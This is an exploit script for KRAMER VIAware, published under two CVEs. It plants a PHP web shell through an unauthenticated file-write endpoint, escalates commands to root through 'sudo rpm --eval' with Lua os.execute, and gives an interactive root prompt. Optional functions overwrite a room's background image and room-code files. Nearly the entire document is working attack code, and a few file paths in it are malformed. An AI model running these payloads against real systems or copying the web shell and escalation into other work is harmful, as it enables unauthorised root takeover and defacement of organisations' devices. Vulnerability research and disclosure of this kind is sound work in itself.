# Exploit Title: Remote Code Execution as Root on KRAMER VIAware
# Date: 31/03/2022
# Exploit Author: sharkmoos & Ballo
# Vendor Homepage: https://www.kramerav.com/
# Software Link: https://www.kramerav.com/us/product/viaware
# Version: *
# Tested on: ViaWare Go (Linux)
# CVE : CVE-2021-35064, CVE-2021-36356

import sys, urllib3
from requests import get, post
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def writeFile(host):
    """
        writeFile- Writes a php web shell into a file located in the Apache web directory called test.php
        using a hidden field in the browser code radioBtnVal and associateFilenName

        session - Current Session
        host - The current host the kia is running on
        command - The command to write into the .cmd file
    """
    headers = {
    "Host": f"{host}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Accept": "text/html, */*",
    "Accept-Language": "en-GB,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Gpc": "1",
    "Te": "trailers",
    "Connection": "close"
    }
    #Write php web shell into the Apache web directory using the radioBtnVal value and associateFileName
    #elements
    data = {
        "radioBtnVal":"""<?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }?>""",
        "associateFileName": "/var/www/html/test.php"}
    post(f"https://{host}/ajaxPages/writeBrowseFilePathAjax.php", headers=headers, data=data, verify=False)


def getResult(host, cmd):
    """
        getResult- Goes to the page where the file was saved to therefore allowing the code to execute and
        the result to be shown back in this terminal as well as putting the chosen command in a rpm string
        which priveldge escalates the command to root user

        cmd - The command to execute with a privledge escalted shell using an rpm exploit
        host - The current host the kia is running on
    """
    # query the web shell, using rpm as sudo for root privileges
    file = get(f"https://{host}/test.php?cmd=" + "sudo rpm --eval '%{lua:os.execute(\"" + cmd + "\")}'", verify=False)
    pageText = file.text
    if len(pageText) < 1:
        result = "Command did not return a result"
    else:
        result = pageText
    return result

def main(host):
    """
        main- Runs the web shell continuesly with priveldge escalated commands until exit is typed
        outputting the result

        host - The current host the kia is running on
    """

    # upload malicious php
    writeFile(host)
    command = ""
    while command != "exit":
        # repeatedly query the webshell
        command = input("root:> ").strip()
        print(getResult(host, command))
    exit()


def theme(host):
    """
        theme- Takes in the session currently being run and credential details allowing
        the certian commands to be written and finally executed changing the theme background

        host - The current host the kia is running on
        username - Username to login as
        password - Password for the user
    """
    #Sends the command to create a backup of the original theme and a second command to change the
    #background photo to a photo of your choice
    command1 = r'cp /tc/httpd/htdocs/uploads/Large/CoventryUniECB.jpg /tc/httpd/htdocs/uploads/Large/CoventryUniECB1.jpg'
    command2 = r'cp /VIAData/default.jpg /tc/httpd/htdocs/uploads/Large/CoventryUniECB.jpg'
    getResult(host, command1)
    getResult(host, command2)



def roomCode(host):
    """
        roomCode- Takes in the session currently being run and sends a command that overwrites the room code
        file

        host - The current host the kia is running on
    """
    #Sends the command to create a backup of the original code name,ip and colour and a second command 
    #to change the current code name, ip and colour
    command1 = r'cp \tc\httpd\htdocs\templatedesigner\templates\CoventryUniECB.txt \tc\httpd\htdocs\templ\tc\httpd\htdocs\templatedesigner\templates\CoventryUniECB1.txt'
    command2 = r'cp \VIAData\default.txt \tc\httpd\htdocs\templatedesigner\templates\CoventryUniECB.txt'
    getResult(host, command1)
    getResult(host, command2)




if __name__ == "__main__":
    """
        Take in the paramters and if any mismatch occurs, a help guide on what to type will be displayed
    """
    args = sys.argv
    numArgs = len(args)
    if  numArgs < 2:
        print(f"Run script in format:\n\n\tpython3 {args[0]} target\n")
        print(f"[Optional] Provide Admin Credentials\n\n\tpython3 {args[0]} target tb")
        print(f"t- Theme text, b- Background photo")
    if numArgs == 2:
        main(args[1])
    if numArgs == 3:
        if (args[2] == "t"):
            theme(args[1])
        elif (args[2] == "b"):
            roomCode(args[1])
        elif (args[2] == "tb" or args[2] =="bt"):
            theme(args[1])
            roomCode(args[1])
    if numArgs > 3:
        print(f"Run script in format:\n\n\tpython3 {args[0]} target\n")
        print(f"[Optional] Provide Admin Credentials\n\n\tpython3 {args[0]} target su supass")

